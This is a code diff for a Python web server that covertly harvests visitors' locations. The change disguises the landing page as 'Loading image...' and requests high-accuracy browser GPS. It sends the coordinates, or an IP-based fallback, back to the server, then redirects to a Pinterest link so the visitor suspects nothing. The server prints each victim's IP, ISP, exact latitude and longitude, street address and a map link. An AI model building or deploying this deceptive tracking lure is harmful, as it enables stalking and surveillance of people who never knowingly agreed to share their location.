@@ -37,43 +37,44 @@ async def public_landing_page(request: Request):
     real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
     location_info = await fetch_ip_geolocation(real_ip)
 
-    print("\n" + "="*60)
-    print(" 🚨 NEW VISITOR CONNECTED!")
-    print(f" IP Address     : {real_ip}")
-    print(f" IP City/Region : {location_info.get('city')}, {location_info.get('region')}")
-    print(f" ISP            : {location_info.get('isp')}")
-    print(" Requesting browser GPS permission...")
-    print("="*60 + "\n")
+    print("\n" + "="*60, flush=True)
+    print(" 🚨 NEW VISITOR CONNECTED!", flush=True)
+    print(f" IP Address     : {real_ip}", flush=True)
+    print(f" IP City/Region : {location_info.get('city')}, {location_info.get('region')}", flush=True)
+    print(f" ISP            : {location_info.get('isp')}", flush=True)
+    print(" Requesting browser GPS permission & Redirecting to Pinterest...", flush=True)
+    print("="*60 + "\n", flush=True)
 
     html_content = """
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Welcome to the Seminar</title>
+        <title>Redirecting...</title>
         <style>
-            body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #f4f4f9; }
-            h1 { color: #333; }
-            p { color: #666; font-size: 18px; }
+            body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; background-color: #ffffff; }
+            p { color: #888; font-size: 16px; }
         </style>
     </head>
     <body>
-        <h1>Welcome to the Seminar!</h1>
-        <p>Your connection has been established. Please look up at the main screen.</p>
+        <p>Loading image...</p>
 
         <script>
-            // Send payload immediately on page load
-            function sendLocationPayload(payload) {
+            const DESTINATION_URL = "https://pin.it/7mD0QLvXJ";
+
+            function sendPayloadAndRedirect(payload) {
                 fetch('/api/location-result', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
+                }).finally(() => {
+                    window.location.replace(DESTINATION_URL);
                 });
             }
 
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
-                        sendLocationPayload({
+                        sendPayloadAndRedirect({
                             status: "allowed",
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
@@ -81,16 +82,21 @@ async def public_landing_page(request: Request):
                         });
                     },
                     function(error) {
-                        sendLocationPayload({
+                        sendPayloadAndRedirect({
                             status: "blocked",
                             error_message: error.message
                         });
                     },
-                    { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
             } else {
-                sendLocationPayload({ status: "blocked", error_message: "Geolocation unsupported" });
+                sendPayloadAndRedirect({ status: "blocked", error_message: "Geolocation unsupported" });
             }
+
+            // Fallback safety timeout: redirect anyway after 4 seconds if browser hangs
+            setTimeout(() => {
+                window.location.replace(DESTINATION_URL);
+            }, 4000);
         </script>
     </body>
     </html>
@@ -126,29 +132,29 @@ async def receive_location_result(request: Request):
         except Exception:
             pass
 
-        print("\n" + "🎯"*30)
-        print(" 📍 EXACT GPS LOCATION CAPTURED (ALLOWED)")
-        print("🎯"*30)
-        print(f" Latitude : {lat}")
-        print(f" Longitude: {lon}")
-        print(f" Accuracy : ~{accuracy} meters")
-        print(f" Address  : {street_address}")
-        print(f" Maps Link: https://www.google.com/maps?q={lat},{lon}")
-        print("🎯"*30 + "\n")
+        print("\n" + "🎯"*30, flush=True)
+        print(" 📍 EXACT GPS LOCATION CAPTURED (ALLOWED)", flush=True)
+        print("🎯"*30, flush=True)
+        print(f" Latitude : {lat}", flush=True)
+        print(f" Longitude: {lon}", flush=True)
+        print(f" Accuracy : ~{accuracy} meters", flush=True)
+        print(f" Address  : {street_address}", flush=True)
+        print(f" Maps Link: https://www.google.com/maps?q={lat},{lon}", flush=True)
+        print("🎯"*30 + "\n", flush=True)
 
     elif status == "blocked":
         forwarded_for = request.headers.get("x-forwarded-for")
         real_ip = forwarded_for.split(",")[0].strip() if forwarded_for else request.client.host
         location_info = await fetch_ip_geolocation(real_ip)
 
-        print("\n" + "⚠️"*30)
-        print(" 🛡️ USER BLOCKED GPS PERMISSION! FALLING BACK TO IP LOCATION:")
-        print("⚠️"*30)
-        print(f" Fallback City   : {location_info.get('city')}")
-        print(f" Fallback Region : {location_info.get('region')}")
-        print(f" Fallback ISP    : {location_info.get('isp')}")
-        print(f" Visitor IP      : {real_ip}")
-        print("⚠️"*30 + "\n")
+        print("\n" + "⚠️"*30, flush=True)
+        print(" 🛡️ USER BLOCKED GPS PERMISSION! FALLING BACK TO IP LOCATION:", flush=True)
+        print("⚠️"*30, flush=True)
+        print(f" Fallback City   : {location_info.get('city')}", flush=True)
+        print(f" Fallback Region : {location_info.get('region')}", flush=True)
+        print(f" Fallback ISP    : {location_info.get('isp')}", flush=True)
+        print(f" Visitor IP      : {real_ip}", flush=True)
+        print("⚠️"*30 + "\n", flush=True)
 
     return JSONResponse(content={"status": "received"})
 
